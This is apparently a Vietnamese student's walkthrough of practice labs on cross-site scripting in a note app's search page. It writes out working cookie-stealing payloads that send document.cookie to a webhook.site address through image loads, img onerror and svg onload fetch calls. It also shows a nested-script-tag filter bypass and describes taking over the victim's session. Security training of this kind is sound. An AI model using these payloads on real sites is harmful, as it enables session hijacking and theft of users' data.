# LAB

# 1. Lab 1 #

<img width="551" height="98" alt="image" src="https://github.com/user-attachments/assets/1d741500-aa61-42b1-9c78-6f3b9ec430df" />

Khi thử chức năng search, ta thấy đoạn text được tự động in đậm

Điều này là bởi vì trong source code, đoạn text được kẹp trong tag `<b>` có tác dụng in đậm đoạn text trong 

<img width="664" height="142" alt="image" src="https://github.com/user-attachments/assets/4b493355-acbc-41a0-83cd-1636c0cefe51" />


Vậy response trả về sẽ được render html


Ta thử dùng tag `<h1>` : `<h1>search something</h1>`

<img width="227" height="112" alt="image" src="https://github.com/user-attachments/assets/4f906c85-1004-482c-901c-ab7f69eba244" />

--> Tag html đã được render thành công

Thành công HTML Injection

Ta thử tiếp với alert `<script>alert(origin)</script>`

<img width="722" height="185" alt="image" src="https://github.com/user-attachments/assets/15a2fa55-67ad-4f7d-8c9e-9c362c194f57" />

Để lấy được flag, thì ta cần đọc được document cookie, sử dụng phiên đăng nhập đó của owner để đọc ở trang note

Ta sẽ đẩy cookie đó qua một server trung gian rồi bắt HTTP response

Với `<script>alert(document.cookie)</script>` để lấy thông tin 

<img width="674" height="183" alt="image" src="https://github.com/user-attachments/assets/9c24b962-c2d2-4851-a383-84202b9a22ee" />

# Các bước exploit

## Bước 1: HTML Injection
## Bước 2: HTML Injection chạy những tag JavaScript để trộm cookie hoặc fetch trang page/note về ( vì page này chứa flag )

Đọc document cookie:
```data=document.cookie```

fetch('/note')
  .then(response => response.text()) 
  .then(data => console.log(data)) ;
  
## Bước 3: Dùng chính JavaScript để leak data ra ngoài Internet ( Sử dụng webhook.site )

Cách 1: để leak data ra:  dùng chính fetch API để gửi HTTP request kèm data leak đến webhook 




Cách 2: tạo ra 1 tấm ảnh và gán đường dẫn là webhook 

```
<script>
data_leak = document.cookie
anh = new Image(); 
anh.src="https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak="+data_leak
</script>
```
## Bước 4: Tạo ra 1 payload hoàn chỉnh trên URL và gửi cho nạn 

Lưu ý: URL encode tất cả dấu cộng "+" để tránh nhầm lẫn giữa kí tự [space] 

```
https://note1.cyberjutsu-lab.tech/search?q=
<script>
data_leak = document.cookie;
anh = new Image(); 
URL_LEAK = "https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak=";
anh.src= URL_LEAK%2Bdata_leak
</script>
```

```
https://note1.cyberjutsu-lab.tech/search?q=
<script>
new Image().src="https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak="%2Bdocument.cookie
</script>
```
## Bước 5: Lấy cookie của nạn nhân rồi sử dụng để đăng nhập phiên của nạn nhân

<img width="959" height="122" alt="image" src="https://github.com/user-attachments/assets/1447c0c1-7ed2-462b-b48f-7d4bfd906d94" />

# 2. Lab 2 #

<img width="626" height="304" alt="image" src="https://github.com/user-attachments/assets/4823c41d-db30-444b-bee9-32c571e1d85e" />

Bài này xóa tag script khi nhập vào

<img width="505" height="72" alt="image" src="https://github.com/user-attachments/assets/55a77d18-c7e6-4d9d-9d5f-dd56a9df5485" />

Để byoass được level 2 thì ta dùng 1 trong 2 cách
- Bypass đoạn regular expression replace dòng 13
- Có thể thực thi dc js mà ko cần tag 

## Cách 1 thẻ img

```
<img%20src="invalid-image"%20onerror="alert(document.cookie)">
```

Thử và thấy hiện alert thành công 

<img width="754" height="169" alt="image" src="https://github.com/user-attachments/assets/66fadb0a-f138-4065-bb31-74e4b77ecb35" />

Giờ ta sẽ thử sử dụng fetch để bắt request bên webhook

```
<img src="invalid-image" onerror="fetch('https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5')">
```

Tiếp theo ta sẽ sửa payload để bắt được giá trị cookie
```
https://note2.cyberjutsu-lab.tech/search?q=%3Cimg%20src=%22invalid-image%22%20onerror=%22fetch(%27https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak=%27%2BencodeURIComponent(document.cookie))%22%3E
```

Thành công lấy được cookie con mèo và flag

<img width="959" height="125" alt="image" src="https://github.com/user-attachments/assets/eebdc205-7b14-4078-8ec9-d576d2e04518" />

## Cách 2 thẻ svg

```
<svg onload="alert(document.cookie)">
```
Thử chức năng alert và lấy thông tin cookie

Tiếp theo, sử dụng fetch để bắt request bên webhook


```
<svg onload="fetch('https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5')">
```
Sửa payload để lấy giá trị cookie 

```
<svg onload="fetch('https://webhook.site/9cc9e2cd-5dd8-45e1-981e-404bb6d8e5b5?leak='+encodeURIComponent(document.cookie))">
```
Được flag 

<img width="845" height="116" alt="image" src="https://github.com/user-attachments/assets/5ce19ed1-a42d-4cde-bae4-ba755dde90a0" />

## Cách 3 : bypass blacklist

<img width="604" height="259" alt="image" src="https://github.com/user-attachments/assets/d54e6334-31a5-44c1-a01d-d74ef816d696" />

Ở đoạn code này, hệ thống chỉ filter cụm `<script>`

Để bypass được đoạn này, ta sẽ thử chèn tag <script> vào giữa đoạn text ta muốn

```
<scr<script>ipt>alert(document.cookie)</scr<script>ipt>
```

Sau khi hệ thống filter `<script>` ta được

```
<script>alert(document.cookie)</script>
```
Ta được 

<img width="796" height="194" alt="image" src="https://github.com/user-attachments/assets/dbefce19-424e-4991-9c24-a88568235128" />



# 3. Lab 3 #

<img width="615" height="347" alt="image" src="https://github.com/user-attachments/assets/0cb8bd93-73af-4a28-a07a-ce5041bb1790" />

Ở bài này, chỉ cần xuất hiện thẻ <script> thì sẽ hiện hack detected

<img width="380" height="65" alt="image" src="https://github.com/user-attachments/assets/130241c8-0679-433c-ac03-6a90224ab622" />

## Cách 1 : có thể áp dụng theo cách 1 trong lab 2

<img width="959" height="97" alt="image" src="https://github.com/user-attachments/assets/f1f73852-948d-4eaa-96c3-a44d459dc231" />

# 4. Lab 4 #

<img width="638" height="347" alt="image" src="https://github.com/user-attachments/assets/c0795dff-9744-45d6-836b-6a59645828ba" />




# NOTE



